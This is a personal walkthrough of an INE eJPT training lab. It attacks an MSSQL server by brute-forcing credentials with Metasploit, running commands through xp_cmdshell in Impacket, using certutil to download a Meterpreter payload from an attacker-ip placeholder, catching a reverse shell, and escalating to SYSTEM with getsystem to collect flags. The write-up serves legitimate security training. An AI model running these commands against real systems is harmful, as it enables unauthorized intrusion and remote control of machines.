# Host & Network Penetration Testing  
## INE eJPT Lab – MSSQL Attack Path (Alternative Method)

> This write-up documents the exact steps taken to complete the lab using valid MSSQL credentials and Impacket.

---

## Step 1 – Initial Enumeration

The first step was a full TCP port scan to identify exposed services:

```bash
nmap -sS -sV -p- -T4 <target-ip>
```


Result:

- Port **1433/tcp** open
- Service: **Microsoft SQL Server**

The scan revealed that Microsoft SQL Server was running on port 1433.

At this point, I had two possible directions:

- Attempt exploitation using available modules  
- Test authentication to see if credentials were obtainable  

I chose to test authentication first.

---

## Step 2 – MSSQL Authentication Testing

Using Metasploit, I ran the MSSQL login scanner:

```bash
auxiliary/scanner/mssql/mssql_login
```

After configuring:

- RHOSTS  
- USER_FILE (i used : /usr/bin/metasploit-framework/data/wordlists/common_users.txt)
- PASS_FILE (i used : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt)  

The module returned a successful login:

```
Login Successful: WORKSTATION\sa
```

Initially, I did not fully understand the output format and had to research what `WORKSTATION\sa` indicated. After clarification, I confirmed that valid SQL administrative credentials were obtained.

This changed the approach completely.

---

## Step 3 – Logging in with Impacket

Instead of using the commonly demonstrated MSSQL exploit module, I decided to authenticate directly using Impacket:

```bash
impacket-mssqlclient sa@<target-ip>
```

Impacket was not covered in the eJPT material, so I had to explore its usage and available commands manually.

After successful authentication, I used the `help` option to understand how to interact with the SQL service.

---

## Step 4 – Testing Command Execution

To verify whether OS-level commands could be executed through SQL Server, I ran:

```sql
xp_cmdshell "systeminfo"
```

The command executed successfully, confirming that command execution was enabled.

To validate further:

```sql
xp_cmdshell "dir C:\"
```

During directory enumeration, I located the first flag.

---

## Step 5 – Obtaining a Proper Shell

While `xp_cmdshell` allowed command execution, it was not convenient for deeper enumeration.

I decided to obtain a reverse shell for better interaction.

A Meterpreter payload was generated using `msfvenom`.

I attempted to transfer it using:

```sql
xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:<port>/shell.exe shell.exe"
```

The first attempt failed due to access restrictions.

I created a temporary writable directory (Temp) in C:\ and retried the transfer in that location. The second attempt succeeded.

```sql
xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:<port>/shell.exe C:\Temp\shell.exe"
```

---

## Step 6 – Establishing Meterpreter Access

I configured `multi/handler` in Metasploit to listen for the reverse connection.

After executing the payload through `xp_cmdshell`, a Meterpreter session was successfully received.
```sql
xp_cmdshell "C:\Temp\shell.exe"
```

I confirmed the current user context using:

```
getuid
```

---

## Step 7 – Privilege Escalation

The next flag required access to the Windows configuration directory.

Attempting to access:

```
C:\Windows\System32\config
```

Resulted in access denied.

To assess available privileges, I ran:

```
getprivs
```

I observed `SeImpersonatePrivilege` was available.

Using:

```
getsystem
```

I was able to escalate privileges successfully.

The user context changed to:

```
NT AUTHORITY\SYSTEM
```

This allowed access to the configuration directory and retrieval of the second flag.

---

## Step 8 – Locating the Third Flag

The hint suggested that another flag was hidden within the system directory.

I performed a targeted search:

```
search -d C:\Windows\System32 -f *.txt
```

This led to a file named:

```
EscalatePrivilegeToGetThisFlag.txt
```

Reading the file revealed the third flag.

---

## Step 9 – Final Flag Discovery

The final instruction directed attention to the Administrator directory.

Navigating to the Administrator profile directory revealed:

```
Flag4.txt
```

## This lab reinforced a few simple but important points:

- Enumeration should guide decisions.  
- Valid credentials can remove the need for exploitation.  
- Tools outside course material can still be valuable.  

There were multiple ways to complete this lab.  
This was simply the path I explored after discovering a misconfiguration.

---
